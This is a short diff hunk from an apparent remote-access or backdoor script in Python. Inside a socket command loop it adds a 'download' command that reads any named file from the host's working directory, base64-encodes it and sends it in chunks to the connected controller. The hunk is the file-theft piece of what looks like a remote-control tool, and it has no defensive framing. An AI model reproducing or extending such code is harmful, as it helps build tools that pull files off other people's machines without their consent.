@@ -69,6 +69,21 @@ while 1:
             connection.send(encode64(b'Done'))
         except:
             connection.send(encode64(b'Wrong file name'))
+    elif "download" in data:
+        file_name = data.split(" ")[1]
+        path = os.path.abspath(os.getcwd())
+        try:
+            with open(f"{path}\\{file_name}","rb") as file:
+                content = file.read()
+                file.close()
+            content = encode64(content)
+            chunks = to_1024(content)
+            connection.send(encode64(str(len(chunks)).encode()))
+            time.sleep(1)
+            for chunk in chunks:
+                connection.sendall(chunk)
+        except:
+            connection.send(encode64(b'Wrong file name'))   
             
     else:
         print(f"Received: {data.decode()}")
